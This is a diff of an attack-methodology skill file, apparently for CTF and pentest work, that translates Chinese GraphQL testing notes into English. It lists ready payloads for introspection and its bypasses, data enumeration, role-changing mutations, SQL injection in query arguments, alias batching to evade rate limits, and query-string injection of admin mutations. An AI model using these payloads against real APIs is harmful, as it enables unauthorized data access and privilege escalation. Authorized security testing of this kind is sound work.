@@ -1,62 +1,65 @@
 ---
 name: graphql-methodology
-description: "GraphQL API 安全测试。当发现 /graphql 端点、POST JSON 查询、GraphQL Playground/Explorer 页面、响应中有 data/errors JSON 结构时使用。包含 Introspection 泄露、注入攻击、权限绕过、嵌套查询 DoS"
+description: "GraphQL API security testing. Use when a /graphql endpoint is discovered, queries are sent as POST JSON, a GraphQL Playground/Explorer page exists, or responses contain the data/errors JSON structure. Covers introspection disclosure, injection attacks, authorization bypass, and nested-query DoS"
+zh-signals: "GraphQL API 安全测试，覆盖 Introspection、注入、权限绕过与嵌套查询 DoS。信号:GraphQL,Introspection,注入攻击,权限绕过,API安全"
+when-to-use: >-
+  Use when a GraphQL endpoint is discovered and you need introspection, injection, authorization bypass, or nested-query DoS testing.
 metadata:
   tags: "graphql,graphql injection,api,introspection,injection,authorization"
   category: "exploit"
 ---
 
-# GraphQL 攻击方法论
+# GraphQL Attack Methodology
 
 
-## Phase 1: 发现GraphQL端点
-常见路径: `/graphql`, `/api/graphql`, `/graphiql`, `/v1/graphql`, `/query`
-检测: POST `{"query":"{ __typename }"}` → 返回 `{"data":{"__typename":"Query"}}` 即确认
+## Phase 1: Discover GraphQL Endpoints
+Common paths: `/graphql`, `/api/graphql`, `/graphiql`, `/v1/graphql`, `/query`
+Detection: POST `{"query":"{ __typename }"}` → returns `{"data":{"__typename":"Query"}}` confirms it
 
-## Phase 2: Introspection 查询（最重要）
-获取完整Schema:
+## Phase 2: Introspection Queries (most important)
+Retrieve the complete schema:
 ```json
 {"query":"{ __schema { types { name fields { name type { name } } } } }"}
 ```
 
-精简版（只看Query和Mutation）:
+Condensed version (Query and Mutation only):
 ```json
 {"query":"{ __schema { queryType { fields { name args { name type { name } } } } mutationType { fields { name args { name type { name } } } } } }"}
 ```
 
-**Introspection结果包含所有类型定义和字段** — 这是最重要的信息源
+**Introspection results contain all type definitions and fields** — this is the most important information source
 
-### 2.1 Introspection 被禁用时的绕过
+### 2.1 Bypassing Disabled Introspection
 
-**方法 1: Field Suggestion（字段建议）**
-GraphQL 引擎对拼写错误会建议正确字段名：
+**Method 1: Field Suggestion**
+The GraphQL engine suggests the correct field name for misspellings:
 ```json
 {"query":"{ __typena }"}
 → "Did you mean '__typename'?"
 ```
-利用这个特性枚举字段：发送错误的字段名，从建议中获取真实字段名。
+Exploit this feature to enumerate fields: send wrong field names and obtain the real field names from the suggestions.
 
-**方法 2: GET 请求绕过**
-有些 WAF 只拦截 POST 的 Introspection，用 GET 绕过：
+**Method 2: GET Request Bypass**
+Some WAFs only block POST introspection, so bypass with GET:
 ```
 GET /graphql?query={__schema{types{name,fields{name}}}}
 ```
 
-**方法 3: 别名/Fragment 绕过**
+**Method 3: Alias/Fragment Bypass**
 ```json
 {"query":"{ a: __schema { types { name } } }"}
 {"query":"fragment f on __Schema { types { name } } { __schema { ...f } }"}
 ```
 
-**方法 4: 空白/换行变体**
+**Method 4: Whitespace/Newline Variants**
 ```json
 {"query":"\n{ __schema\n{ types\n{ name } } }"}
 ```
 
-> GraphQL 字段名大小写敏感，标准 introspection 字段是 `__schema`；`__SCHEMA` 不是有效的大小写绕过。
+> GraphQL field names are case-sensitive and the standard introspection field is `__schema`; `__SCHEMA` is not a valid case-based bypass.
 
-**方法 5: 逐字段猜测**
-如果以上都不行，根据常见命名猜测：
+**Method 5: Field-by-Field Guessing**
+If none of the above works, guess based on common naming:
 ```json
 {"query":"{ user { id } }"}
 {"query":"{ users { id } }"}
@@ -65,8 +68,8 @@ GET /graphql?query={__schema{types{name,fields{name}}}}
 {"query":"{ getUser(id:1) { id } }"}
 ```
 
-## Phase 3: 数据枚举
-根据Schema逐个查询:
+## Phase 3: Data Enumeration
+Query each one according to the schema:
 ```json
 {"query":"{ users { id username email role } }"}
 {"query":"{ user(id: 1) { id username email role flag } }"}
@@ -74,52 +77,52 @@ GET /graphql?query={__schema{types{name,fields{name}}}}
 {"query":"{ admin { flag } }"}
 {"query":"{ posts { id title content author } }"}
 ```
-注意隐藏字段（Schema中有但页面未展示的字段）
+Watch for hidden fields (present in the schema but not displayed on the page)
 
-## Phase 4: 权限绕过
-1. 直接查询管理字段:
+## Phase 4: Authorization Bypass
+1. Directly query admin fields:
    ```json
    {"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}
    ```
-2. 嵌套查询（Batch攻击）:
+2. Nested queries (Batch attack):
    ```json
    {"query":"{ user(id:1){flag} user2:user(id:2){flag} }"}
    ```
-3. 别名遍历ID:
+3. Alias-based ID traversal:
    ```json
    {"query":"{ u1:user(id:1){id,name,flag} u2:user(id:2){id,name,flag} u3:user(id:3){id,name,flag} }"}
    ```
 
-## Phase 5: 注入
-GraphQL参数中的SQL注入:
+## Phase 5: Injection
+SQL injection in GraphQL parameters:
 ```json
 {"query":"{ user(name: \"admin' OR '1'='1\") { id flag } }"}
 {"query":"{ search(keyword: \"' UNION SELECT flag FROM flags--\") { results } }"}
 ```
 
-## Phase 6: 高级技巧
-- 工具辅助：Clairvoyance、graphql-cop 等自动化工具帮助发现隐藏字段
-- 批量查询（Batching）：单个查询中一次请求多个结果 `{a:user(id:1){name} b:user(id:2){name}}`
-- WAF 绕过：URL 编码（`%7B`）编码绕过；换行/空格变体
+## Phase 6: Advanced Techniques
+- Tooling: Clairvoyance, graphql-cop and other automation tools help discover hidden fields
+- Batching: request multiple results in a single query `{a:user(id:1){name} b:user(id:2){name}}`
+- WAF bypass: URL encoding (`%7B`) bypass; newline/whitespace variants
 
 ---
 
-## CTF GraphQL 技巧补充
+## Additional CTF GraphQL Techniques
 
-### 别名批量操作绕过速率限制
-单个请求中用别名重复同一 mutation（如投票/认证）绕过频率限制：
+### Alias Batching to Bypass Rate Limits
+Repeat the same mutation (such as voting/authentication) with aliases in a single request to bypass rate limiting:
 ```graphql
 mutation {
   a1: vote(id: "target") { ok }
   a2: vote(id: "target") { ok }
-  # 重复 N 次...
+  # repeat N times...
 }
 ```
-也可用数组批量: `POST body: [{"query":"mutation{...}"}, {"query":"mutation{...}"}, ...]`
+You can also batch with an array: `POST body: [{"query":"mutation{...}"}, {"query":"mutation{...}"}, ...]`
 
-### 字符串插值注入
-当服务端拼接 GraphQL 查询字符串时，类似 SQLi 的注入：
+### String Interpolation Injection
+When the server concatenates GraphQL query strings, injection similar to SQLi is possible:
 ```javascript
-// 输入: ") { result } } mutation { adminAction(secret: true) { flag } } #
-// 闭合原查询并注入新 mutation
+// Input: ") { result } } mutation { adminAction(secret: true) { flag } } #
+// Close the original query and inject a new mutation
 ```
